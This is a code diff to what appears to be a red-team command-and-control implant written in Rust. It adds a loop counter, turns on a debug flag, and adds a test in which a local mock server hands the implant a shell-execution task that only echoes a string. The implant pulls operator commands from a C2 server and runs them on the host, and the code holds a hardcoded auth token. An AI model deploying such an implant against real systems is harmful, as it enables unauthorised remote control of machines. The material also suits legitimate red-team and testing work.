@@ -171,8 +171,9 @@ fn get_os_pretty_name() -> Result<String> {
 }
 
 // Async handler for port scanning.
-async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
-    let debug = false;
+async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
+    let debug = true;
+    let mut loop_count: i32 = 0;
     let version_string = "v0.1.0";
     let auth_token = "letmeinnn";
     let config_file = File::open(config_path)?;
@@ -380,7 +381,12 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
 
         // change the reference! This is insane but okay.
         all_exec_futures = running_exec_futures;
-        if run_once { return Ok(()); };
+
+        // Debug loop tracker
+        if loop_count_max.is_some() {
+            loop_count += 1;
+            if (loop_count >= loop_count_max.context("loop_count_max shouldn't be None")?) { return Ok(()); };
+        }
     }
 }
 
@@ -426,7 +432,7 @@ pub fn main() -> Result<(), imix::Error> {
     }
 
     if let Some(config_path) = matches.value_of("config") {
-        match runtime.block_on(main_loop(config_path.to_string(), false)) {
+        match runtime.block_on(main_loop(config_path.to_string(), None)) {
             Ok(_) => {},
             Err(error) => eprintln!("Imix main_loop exited unexpectedly with config: {}\n{}", config_path.to_string(), error),
         }
@@ -614,7 +620,7 @@ print("main_loop_test_success")"#.to_string(),
 
         // Define a future for our execution task
         let start_time = Utc::now().time();
-        let exec_future = main_loop(path_new, true);
+        let exec_future = main_loop(path_new, Some(1));
         let _result = runtime.block_on(exec_future).unwrap();
         let end_time = Utc::now().time();
         let diff = (end_time - start_time).num_milliseconds();
@@ -706,10 +712,101 @@ print("main_loop_test_success")"#.to_string(),
             .build()
             .unwrap();
 
-        let exec_future = main_loop(path_new, true);
+        let exec_future = main_loop(path_new, Some(1));
         let _result = runtime.block_on(exec_future)?;
         assert!(true);
         Ok(())
     }
+
+    #[test]
+    fn imix_test_main_loop_fail_one_checkin() -> Result<()> {
+        let test_task_id = "17179869185".to_string();
+
+        // Response expectations are poped in reverse order.
+        let server = Server::run();
+
+        let post_result_response = GraphQLResponse {
+            data: Some(SubmitTaskResult {
+                id: test_task_id.clone(),
+            }),
+            errors: None,
+            extensions: None,
+        };
+        server.expect(
+            Expectation::matching(all_of![
+                request::method_path("POST", "/graphql"),
+                request::body(matches(".*variables.*execStartedAt.*"))
+            ])
+            .times(1)
+            .respond_with(status_code(200)
+            .body(serde_json::to_string(&post_result_response)?))
+        );
+
+        let claim_task_response = GraphQLResponse {
+            data: Some(ClaimTasksResponseData {
+                claim_tasks: vec![
+                    Task {
+                        id: test_task_id.clone(),
+                        quest: Quest {
+                            id:"4294967297".to_string(),
+                            name: "Exec stuff".to_string(),
+                            parameters: Some(r#"{"cmd":"echo main_loop_test_success"}"#.to_string()),
+                            tome: Tome {
+                                id: "21474836482".to_string(),
+                                name: "sys exec".to_string(),
+                                description: "Execute system things.".to_string(),
+                                param_defs: Some(r#"[{"name":"cmd","type":"string"}]"#.to_string()),
+                                eldritch: r#"print(sys.shell(input_params["cmd"]))"#.to_string(),
+                                files: None,
+                            },
+                            bundle: None
+                        },
+                    },
+                ],
+            }),
+            errors: None,
+            extensions: None,
+        };
+        server.expect(
+            Expectation::matching(all_of![
+                request::method_path("POST", "/graphql"),
+                request::body(matches(".*variables.*hostPlatform.*"))
+            ])
+            .times(2)
+            .respond_with(status_code(200)
+            .body(serde_json::to_string(&claim_task_response)?))
+        );
+        let url = server.url("/graphql").to_string();
+
+        let tmp_file_new = NamedTempFile::new()?;
+        let path_new = String::from(tmp_file_new.path().to_str().unwrap()).clone();
+        let _ = std::fs::write(path_new.clone(),format!(r#"{{
+    "service_configs": [],
+    "target_forward_connect_ip": "127.0.0.1",
+    "target_name": "test1234",
+    "callback_config": {{
+        "interval": 4,
+        "jitter": 1,
+        "timeout": 4,
+        "c2_configs": [
+        {{
+            "priority": 1,
+            "uri": "{url}"
+        }}
+        ]
+    }}
+}}"#));
+
+        let runtime = tokio::runtime::Builder::new_multi_thread()
+            .enable_all()
+            .build()
+            .unwrap();
+
+        let exec_future = main_loop(path_new, Some(2));
+        let _result = runtime.block_on(exec_future)?;
+        assert!(true);
+        Ok(())
+    }
+
 }
 
